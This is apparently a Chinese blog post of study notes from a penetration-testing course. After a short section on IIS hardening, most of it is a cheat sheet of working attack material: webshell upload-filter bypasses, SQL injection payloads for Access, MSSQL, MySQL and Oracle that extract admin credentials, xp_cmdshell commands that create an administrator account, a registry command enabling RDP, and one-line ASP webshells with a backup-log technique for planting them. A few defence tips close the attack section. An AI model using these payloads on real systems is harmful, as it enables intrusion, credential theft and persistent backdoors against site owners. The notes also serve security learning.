@@ -1,0 +1,144 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 安全牛：网络渗透与深度防御视频-整理笔记 · Uknow’s Blog</title><meta name="description" content="安全牛：网络渗透与深度防御视频-整理笔记 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="http://weibo.com/u/3477219002" target="_blank" class="nav-list-link">Weibo</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">Rss</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">安全牛：网络渗透与深度防御视频-整理笔记</h1><div class="post-time">Nov 20, 2016</div><div class="post-content"><p><img src="http://obr4sfdq7.bkt.clouddn.com/1622444d95f1718371.png" alt="安全牛"></p>
+<a id="more"></a>
+<h2 id="Web加固"><a href="#Web加固" class="headerlink" title="Web加固"></a>Web加固</h2><h3 id="IIS加固"><a href="#IIS加固" class="headerlink" title="IIS加固"></a>IIS加固</h3><ul>
+<li>日志:更改默认日志的路径.记录:cookies 协议版本</li>
+<li>权限:只读,脚本资源访问<br>主目录</li>
+<li>删除所有不需要的脚本扩展名:主目录:asp </li>
+<li>向客户端发送以下消息:处理URL出错:<br>主目录–配置–调试</li>
+<li>限定访问后台的IP:目录安全性</li>
+<li>删除所有自定义错误:防止被挂马</li>
+</ul>
+<h3 id="防止数据下载"><a href="#防止数据下载" class="headerlink" title="防止数据下载"></a>防止数据下载</h3><ul>
+<li>修改数据库名,和默认路径</li>
+<li>数据库重定向到主页</li>
+<li>防暴库：conn.asp:on error resume next</li>
+</ul>
+<h3 id="NTFS-小到大"><a href="#NTFS-小到大" class="headerlink" title="NTFS:小到大"></a>NTFS:小到大</h3><ul>
+<li>删除所有权限。</li>
+<li>给administrator完全控制权限</li>
+<li>给IIS_WPG  完全控制</li>
+<li>给IUSR_HOSTNAME 只读</li>
+</ul>
+<h3 id="终级防网马-webshell"><a href="#终级防网马-webshell" class="headerlink" title="终级防网马:webshell"></a>终级防网马:webshell</h3><p> 能写不能执行,能执行不能写入</p>
+<ul>
+<li>哪些目录需要写入权限:data uploadfile uploadface<br>databackup—&gt;iusr_heixia</li>
+<li>在IIS中给以下目录拒绝执行权限</li>
+</ul>
+<h2 id="常用攻击方法"><a href="#常用攻击方法" class="headerlink" title="常用攻击方法"></a>常用攻击方法</h2><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><p>  #：%23<br>  %：%25<br>  空格：%20<br>  www.xx.com/bbs/a.asp?id=1<br>  ‘<br>  id=a<br>   id=999999<br>   第二个/替换为%5c<br>   id[]=1<br>   apsx:~a.asp<br>   jsp:%81,原代码，<br>  .JSP<br>  .js%2527<br>  www.xx.com/abc.asp加不存在页面</p>
+<p>  数据库密码技巧<br>  Log日志文件  登录日志</p>
+<h3 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h3><ul>
+<li><p>无任何限制：<br>　　直接上传</p>
+</li>
+<li><p>限制后缀：黑名单 asp,asax<br>　　突破：a.cer,a.cdx</p>
+</li>
+<li><p>后缀替换为空：<br>a.aaspsp<br>　a.asaspp</p>
+</li>
+<li><p>mine.types:<br>　a.php.rar.rar.rar</p>
+</li>
+<li><p>a.asp. a#2easp</p>
+</li>
+<li><p>windows2003解析漏洞：<br>建立文件夹：a.asp<br>里面放任何文件都会解析为.asp</p>
+</li>
+<li><p>文件改名为：a.asp;.jpg</p>
+<p>8.本地验证：<br>前台上传webshell  记录webshell路径<br>后台数据库备份修改后缀</p>
+</li>
+</ul>
+<h2 id="手工注入Access"><a href="#手工注入Access" class="headerlink" title="手工注入Access"></a>手工注入Access</h2><h3 id="注入成因"><a href="#注入成因" class="headerlink" title="注入成因"></a>注入成因</h3><p>程序对用户输入的字符没有进行过滤</p>
+<h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>万能密码（参数查询不适用）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;or&apos;=&apos;or&apos;</span><br></pre></td></tr></table></figure>
+<p>原因分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">登录语句：</span><br><span class="line">select * from admin where username =&apos;$username&apos; and password=&apos;$password&apos;</span><br><span class="line"></span><br><span class="line">插入 &apos;or&apos;=&apos;or&apos;,语句变为：</span><br><span class="line">select * from admin where username =&apos;&apos;or&apos;=&apos;or&apos;&apos; and password=&apos;$password&apos;</span><br><span class="line"></span><br><span class="line">or 前面的单引号用于闭合原语句的单引号，此时username等于空，此时&apos;=&apos;判断为true，</span><br><span class="line">再与username或判断为true，第二个or后的单引号用于闭合。</span><br></pre></td></tr></table></figure>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xx.com/a.asp?id=1</span><br><span class="line">and 1=1 返回正常</span><br><span class="line">and 1=2 返回错误</span><br></pre></td></tr></table></figure>
+<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from 数据库独有表名)&gt;0</span><br><span class="line">count:统计数据库表个数</span><br></pre></td></tr></table></figure>
+<p>附加:</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th style="text-align:left">数据库独有表名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>access</td>
+<td style="text-align:left">mssysobjects</td>
+</tr>
+<tr>
+<td>mssql</td>
+<td style="text-align:left">sysbojects</td>
+</tr>
+<tr>
+<td>mysql</td>
+<td style="text-align:left">infomation_schema.tables</td>
+</tr>
+<tr>
+<td>oracle</td>
+<td style="text-align:left">sys.user_tables</td>
+</tr>
+</tbody>
+</table>
+<h3 id="判断表名"><a href="#判断表名" class="headerlink" title="判断表名"></a>判断表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from admin) &gt;0</span><br><span class="line"></span><br><span class="line">返回正常 说明admin表存在</span><br><span class="line">返回错误 说明admin表不存在</span><br></pre></td></tr></table></figure>
+<h3 id="判断列名"><a href="#判断列名" class="headerlink" title="判断列名"></a>判断列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and (select count(admin_user) from admin) &gt;0</span><br><span class="line"></span><br><span class="line">将*换成你需要猜的列名即可</span><br><span class="line">返回正常 说明admin表存在列admin_user</span><br><span class="line">返回错误 说明admin表不存在列admin_user</span><br></pre></td></tr></table></figure>
+<h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><p>判断长度函数：len(admin_user) </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and (select len(admin_user) from admin)&gt;4   返回正常</span><br><span class="line">and (select len(admin_user) from admin)&lt;5	返回错误</span><br><span class="line"></span><br><span class="line">说明当前密码长度为5</span><br></pre></td></tr></table></figure>
+<h3 id="判断值"><a href="#判断值" class="headerlink" title="判断值"></a>判断值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">left(admin_user,1)=&apos;a&apos;  判断左边起一个字符是否为a</span><br><span class="line"></span><br><span class="line">and (select left(admin_user,1) from admin)=&apos;a&apos;</span><br><span class="line">and (select left(admin_user,2) from admin)=&apos;ad&apos; 左边起前两个是否为ad</span><br></pre></td></tr></table></figure>
+<h2 id="手工注入MSSQL"><a href="#手工注入MSSQL" class="headerlink" title="手工注入MSSQL"></a>手工注入MSSQL</h2><h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=1;    返回正常</span><br><span class="line">and 1=2;	返回错误</span><br><span class="line">and @@version&gt;0   判断版本</span><br></pre></td></tr></table></figure>
+<h3 id="查看当前连接数据库的用户名"><a href="#查看当前连接数据库的用户名" class="headerlink" title="查看当前连接数据库的用户名"></a>查看当前连接数据库的用户名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and user&gt;0</span><br><span class="line">返回：</span><br><span class="line">dbo=sa mssql管理员</span><br><span class="line">端口 1433</span><br></pre></td></tr></table></figure>
+<h3 id="查看当前连接数据库"><a href="#查看当前连接数据库" class="headerlink" title="查看当前连接数据库"></a>查看当前连接数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br></pre></td></tr></table></figure>
+<h3 id="查看其他数据库"><a href="#查看其他数据库" class="headerlink" title="查看其他数据库"></a>查看其他数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&lt;&gt;0</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">sysdatabases里面存储的是一些系统信息，包括所有数据库的名字。</span><br><span class="line">Dbid就是数据库的id，dbid的值从1到5被系统占用，所以其他数据库是从6开始的</span><br><span class="line">将name与1比较，类型转换错误也就爆出了数据库的名字。将dbid的值从6开始试下去，就得到了所有的库名</span><br></pre></td></tr></table></figure>
+<h3 id="判断表名-1"><a href="#判断表名-1" class="headerlink" title="判断表名"></a>判断表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysbojects where xtype=&apos;u&apos; and status&gt;0)&gt;0</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">sysbojects是SQLServer的系统表，存储着所有的表名、视图、约束及其他对象，</span><br><span class="line">其中&quot;xtype=&apos;u&apos; and status&gt;0&quot;表示用户建立的表名</span><br><span class="line">上面的语句将第一个表名取出，与0比较大小，让错误信息把表名报出来</span><br></pre></td></tr></table></figure>
+<h3 id="判断其他表"><a href="#判断其他表" class="headerlink" title="判断其他表"></a>判断其他表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 name from sysbojects where xtype=&apos;u&apos; and status&gt;0 and name not in (&apos;已猜出表&apos;))&gt;0</span><br></pre></td></tr></table></figure>
+<h3 id="判断列名-1"><a href="#判断列名-1" class="headerlink" title="判断列名"></a>判断列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">第一字段为&quot;ID&quot;，用object_id(表名)能获取表名对应的内部ID。</span><br><span class="line">col_name(表名ID，1)代表该表的第1个字段名，将1换乘2，3，4...</span><br><span class="line">就可以逐个获取所猜解表里面的所有字段名</span><br></pre></td></tr></table></figure>
+<h3 id="判断值-1"><a href="#判断值-1" class="headerlink" title="判断值"></a>判断值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select username from admin)&gt;0</span><br><span class="line">and (select password from admin)&gt;0</span><br></pre></td></tr></table></figure>
+<h3 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;update 库名.abo.admin表 set password=&apos;a123456&apos; where username=&apos;admin&apos;;--</span><br><span class="line">--: 注释符</span><br></pre></td></tr></table></figure>
+<h2 id="mssql注入高级操作"><a href="#mssql注入高级操作" class="headerlink" title="mssql注入高级操作"></a>mssql注入高级操作</h2><h3 id="建立数据库用户"><a href="#建立数据库用户" class="headerlink" title="建立数据库用户"></a>建立数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addlogin user,pass;--</span><br></pre></td></tr></table></figure>
+<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..sp_addsrvrolemember user,sysadmin;--</span><br></pre></td></tr></table></figure>
+<h3 id="打开3389"><a href="#打开3389" class="headerlink" title="打开3389"></a>打开3389</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d &quot;0&quot; /f</span><br></pre></td></tr></table></figure>
+<h3 id="建立系统用户"><a href="#建立系统用户" class="headerlink" title="建立系统用户"></a>建立系统用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &quot;net user username password /add&quot;--</span><br><span class="line">;exec master..xp_cmdshell &quot;net localgroup administrators username /add&quot;--</span><br></pre></td></tr></table></figure>
+<h3 id="读系统写文件"><a href="#读系统写文件" class="headerlink" title="读系统写文件"></a>读系统写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.利用查询分析器连接数据库</span><br><span class="line">2.create table vvboot (line varchar(8000))  创建表</span><br><span class="line">3.bulk insert vvboot from &apos;c:\boot.ini&apos;     导入c:\boot.ini内容进tables</span><br><span class="line">4.select * from vvboot 			    读取tables内容</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;exec master..xp_cmdshell &apos;echo aaa&gt;&gt;c:u.txt&apos;--  写入aa到c:u.txt &gt;&gt;追加</span><br></pre></td></tr></table></figure>
+<h3 id="备份拿一句话木马"><a href="#备份拿一句话木马" class="headerlink" title="备份拿一句话木马"></a>备份拿一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute request(&quot;value&quot;)%&gt;</span><br><span class="line">&lt;%eval request(&quot;1&quot;)%&gt;</span><br><span class="line">URL编码：%3C%25execute+request%28%22value%22%29%25%3E </span><br><span class="line">十六进制：0x3C25657865637574652072657175657374282276616C75652229253E</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">；alter database article set RECOVERY FULL--   把恢复改为完全模式</span><br><span class="line">；create table　　alog (a image)--       建立一个表</span><br><span class="line">；backup alog article to disk=&apos;c:\cmd&apos; with init--     减少备份大小</span><br><span class="line">;insert into alog (a) values(&apos;&lt;%execute request(&quot;value&quot;)%&gt;&apos;)--     插入一句话木马</span><br><span class="line">;backup log article to disk=&apos;C:\darticle3.4\darticle3.4\a.asp&apos;--      备份日志</span><br></pre></td></tr></table></figure>
+<h3 id="注入防范"><a href="#注入防范" class="headerlink" title="注入防范"></a>注入防范</h3><p>安全编码，参数化查询<br>WAF<br>防注入的脚本:<br>过滤关键字:and select update or union post get cookie<br>在有漏洞脚本调用防注入的脚本：</p>
+<pre><code>&lt;!--#Include File=&quot;防注入脚本.asp&quot;--&gt;
+</code></pre><h2 id="手工注入MySQL"><a href="#手工注入MySQL" class="headerlink" title="手工注入MySQL"></a>手工注入MySQL</h2><h3 id="数据库的管理工具"><a href="#数据库的管理工具" class="headerlink" title="数据库的管理工具"></a>数据库的管理工具</h3><pre><code>phpmyadmin
+    默认user:root
+    默认pass:php168.com
+</code></pre><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><pre><code>magic_quotes_gpc=on
+</code></pre><p>对于GET/POST/Cookie提交的数据中的单引号、双引号、反斜线和空字节进行转义<br>也就是在这个字符前面加上反斜线，提交的“’”会变成“\”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;=%2527  绕过限制</span><br><span class="line">char(90) </span><br><span class="line">left(boardname,2)=char(97,104)</span><br></pre></td></tr></table></figure>
+<h3 id="uion联合查询"><a href="#uion联合查询" class="headerlink" title="uion联合查询"></a>uion联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table1,table2 from db1</span><br></pre></td></tr></table></figure>
+<p>条件：</p>
+<ul>
+<li>前后表的列数要相同<pre><code>判断前表查询列数
+union select 1 返回正常 表明前表为一列
+union select 1,2,3,4,5 返回正常 表明前表为五列
+union select null,null,null,null,null 
+</code></pre> oracle:<pre><code>union select null,null,null,null,null from dual (oracle默认表名)
+</code></pre></li>
+<li>前后表对应列的数据类型要兼容<pre><code>判断前表哪列是字符
+union select &apos;1&apos;,2,3,4,5   返回正常 说明第一列为字符
+</code></pre></li>
+<li>如果前表出错，将返回后表的结果<pre><code>id=-1 union select user()
+id=-1 union select database()
+</code></pre></li>
+</ul>
+<p>###　判断注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 返回正常</span><br><span class="line">and 1=2 返回错误</span><br></pre></td></tr></table></figure>
+<h3 id="判断用户名"><a href="#判断用户名" class="headerlink" title="判断用户名"></a>判断用户名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select user()   联合查询</span><br><span class="line">union select current_user() 当前用户</span><br><span class="line">union select system_user() 系统用户</span><br><span class="line">id=-1 union select session_user()  连接数据库的用户</span><br></pre></td></tr></table></figure>
+<h3 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select version()</span><br></pre></td></tr></table></figure>
+<h3 id="判断当前连接数据库"><a href="#判断当前连接数据库" class="headerlink" title="判断当前连接数据库"></a>判断当前连接数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select database()</span><br></pre></td></tr></table></figure>
+<h3 id="判断表名-2"><a href="#判断表名-2" class="headerlink" title="判断表名"></a>判断表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select table from ddbname</span><br></pre></td></tr></table></figure>
+<h3 id="判断值-2"><a href="#判断值-2" class="headerlink" title="判断值"></a>判断值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select username from dbname</span><br></pre></td></tr></table></figure>
+<h3 id="读文件-load-file"><a href="#读文件-load-file" class="headerlink" title="读文件(load_file())"></a>读文件(load_file())</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select load_file(&apos;c:\boot.ini&apos;)</span><br><span class="line">将文件名 c:\boot.ini 转换为十六进制 绕过“\”转义</span><br></pre></td></tr></table></figure>
+<h2 id="手工注入Oracle"><a href="#手工注入Oracle" class="headerlink" title="手工注入Oracle"></a>手工注入Oracle</h2><h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1union select null , null from dual</span><br><span class="line">id=-1union select null, null , null from dual</span><br><span class="line">id=-1 union select null,null,null,null,null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure>
+<h3 id="猜哪个字段为字符串"><a href="#猜哪个字段为字符串" class="headerlink" title="猜哪个字段为字符串"></a>猜哪个字段为字符串</h3><p>猜哪个字段是字符串型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select &apos;1&apos;,null,null,null,null,null,null,null,null,null,null,null,null from dual   第九个</span><br></pre></td></tr></table></figure></p>
+<h3 id="猜用户"><a href="#猜用户" class="headerlink" title="猜用户"></a>猜用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,user,null,null,null,null from user_tables  </span><br><span class="line"> 将用户代入字符串字段</span><br></pre></td></tr></table></figure>
+<h3 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,banner,null,null,null,null from v$version  </span><br><span class="line"> 将banner代入字符串字段</span><br></pre></td></tr></table></figure>
+<h3 id="看库名"><a href="#看库名" class="headerlink" title="看库名"></a>看库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,name,null,null,null,null from v$database    </span><br><span class="line"> 将库名代入字符串字段</span><br></pre></td></tr></table></figure>
+<h3 id="看表数"><a href="#看表数" class="headerlink" title="看表数"></a>看表数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from user_tables  </span><br><span class="line"> 将count(*)||&apos;&apos; 函数 代入字符串字段</span><br></pre></td></tr></table></figure>
+<h3 id="看第一个表名"><a href="#看第一个表名" class="headerlink" title="看第一个表名"></a>看第一个表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,table_name,null,null,null,null from (select rownum aa,table_name from user_tables) where aa=1</span><br></pre></td></tr></table></figure>
+<h3 id="查看表的记录数"><a href="#查看表的记录数" class="headerlink" title="查看表的记录数"></a>查看表的记录数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from USERINFO</span><br></pre></td></tr></table></figure>
+<h3 id="查看第一条记录"><a href="#查看第一条记录" class="headerlink" title="查看第一条记录"></a>查看第一条记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,USER_ACCOUNT,null,null,null,null from(select rownum aa,USER_ACCOUNT from USERINFO)where aa=1</span><br></pre></td></tr></table></figure>
+<h3 id="查看密码"><a href="#查看密码" class="headerlink" title="查看密码"></a>查看密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select null,null,null,null,null,null,null,null,PASSWORD,null,null,null,null from(select rownum aa,PASSWORD from USERINFO)where aa=1</span><br></pre></td></tr></table></figure>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/《细说PHP》学习笔记.html" class="prev">PREV</a><a href="/posts/notes/智能社：JavaScript教程-从入门到精通视频整理笔记.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="http://uknowsec.cn">uknow</a>, Powered by Hexo & Hexo-theme-apollo.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
